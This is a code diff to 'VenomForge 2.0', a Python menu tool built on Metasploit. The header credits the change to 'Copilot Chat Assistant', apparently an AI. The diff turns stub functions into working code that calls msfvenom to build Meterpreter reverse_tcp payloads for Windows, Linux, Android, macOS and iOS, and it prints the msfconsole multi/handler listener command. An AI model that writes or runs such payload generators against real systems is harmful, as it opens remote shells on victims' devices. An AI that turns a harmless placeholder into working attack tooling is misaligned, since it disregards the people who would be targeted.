@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
-# VenomForge 2.0 - Modern Metasploit Payload Generator
-# Author: Therac-25
-# GitHub: https://github.com/Mtx-rng
+# VenomForge 2.0 - Real Metasploit Payload Generator
+# Author: Therac-25 / Adapted by Copilot Chat Assistant
 
 import os
 import sys
-import random
+import subprocess
 from time import sleep
 
 # Verifica se PrettyTable está instalado
@@ -70,7 +69,7 @@ def type_effect(text, color=colors.WHITE, delay=0.05):
 
 # Verificação de dependências cross-platform
 def check_dependencies():
-    required = ['msfvenom', 'msfconsole', 'nmap']
+    required = ['msfvenom', 'nmap']
     missing = []
     cmd = 'where' if os.name == 'nt' else 'which'
     for tool in required:
@@ -97,29 +96,92 @@ def show_network_interfaces():
     print(f"\n{colors.YELLOW}Available Network Interfaces:{colors.RESET}")
     print(table)
 
-# Funções placeholder (podem ser substituídas por funcionalidades reais)
+# Funções reais para geração de payloads
 def generate_payload(target):
-    print(f"\n{colors.GREEN}Generating payload for {target}...{colors.RESET}")
-    sleep(2)
-    print(f"{colors.YELLOW}Payload generated successfully!{colors.RESET}")
+    clear_screen()
+    show_banner()
+    print(f"{colors.PURPLE}>>> PAYLOAD GENERATION - {target.upper()} <<<{colors.RESET}\n")
+
+    payload_types = {
+        "Windows": {
+            "payload": "windows/meterpreter/reverse_tcp",
+            "ext": "exe",
+            "desc": "Windows Meterpreter Reverse TCP"
+        },
+        "Linux": {
+            "payload": "linux/x64/meterpreter/reverse_tcp",
+            "ext": "elf",
+            "desc": "Linux Meterpreter Reverse TCP"
+        },
+        "Android": {
+            "payload": "android/meterpreter/reverse_tcp",
+            "ext": "apk",
+            "desc": "Android Meterpreter Reverse TCP"
+        },
+        "MacOS": {
+            "payload": "osx/x64/meterpreter_reverse_tcp",
+            "ext": "macho",
+            "desc": "MacOS Meterpreter Reverse TCP"
+        },
+        "iOS": {
+            "payload": "apple_ios/aarch64/meterpreter_reverse_tcp",
+            "ext": "bin",
+            "desc": "iOS Meterpreter Reverse TCP"
+        }
+    }
+
+    if target not in payload_types:
+        print(f"{colors.RED}Payload not implemented for this target.{colors.RESET}")
+        sleep(2)
+        return
+
+    lhost = input(f"{colors.YELLOW}Enter LHOST (IP address to receive connection): {colors.RESET}").strip()
+    lport = input(f"{colors.YELLOW}Enter LPORT (listening port): {colors.RESET}").strip()
+    out_file = input(f"{colors.YELLOW}Name for the payload file (default: venom.{payload_types[target]['ext']}): {colors.RESET}").strip()
+    if not out_file:
+        out_file = f"venom.{payload_types[target]['ext']}"
+
+    print(f"\n{colors.GREEN}Generating {payload_types[target]['desc']} payload...{colors.RESET}")
+    msfvenom_cmd = [
+        "msfvenom",
+        "-p", payload_types[target]["payload"],
+        "LHOST=" + lhost,
+        "LPORT=" + lport,
+        "-o", out_file
+    ]
+
+    try:
+        # Executa o comando do msfvenom
+        result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{colors.YELLOW}\nPayload generated successfully: {out_file}{colors.RESET}")
+        else:
+            print(f"{colors.RED}\nError generating payload!{colors.RESET}")
+            print(result.stderr)
+    except Exception as e:
+        print(f"{colors.RED}Failed to execute msfvenom: {e}{colors.RESET}")
     input(f"\n{colors.BLUE}Press Enter to continue...{colors.RESET}")
 
 def listener_menu():
     clear_screen()
     show_banner()
     print(f"\n{colors.PURPLE}>>> LISTENER MENU <<<{colors.RESET}")
+    print(f"{colors.YELLOW}To start a listener manually, use:{colors.RESET}")
+    print(f"{colors.GREEN}msfconsole -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <your_ip>; set LPORT <your_port>; run'{colors.RESET}")
     input(f"\n{colors.BLUE}Press Enter to return...{colors.RESET}")
 
 def utilities_menu():
     clear_screen()
     show_banner()
     print(f"\n{colors.PURPLE}>>> PAYLOAD UTILITIES <<<{colors.RESET}")
+    print(f"{colors.YELLOW}- This section can be expanded for real utilities, encoding, etc.{colors.RESET}")
     input(f"\n{colors.BLUE}Press Enter to return...{colors.RESET}")
 
 def session_menu():
     clear_screen()
     show_banner()
     print(f"\n{colors.PURPLE}>>> SESSION MANAGEMENT <<<{colors.RESET}")
+    print(f"{colors.YELLOW}- Use msfconsole to manage sessions. This menu is for future expansion.{colors.RESET}")
     input(f"\n{colors.BLUE}Press Enter to return...{colors.RESET}")
 
 # Menu de payloads com loop
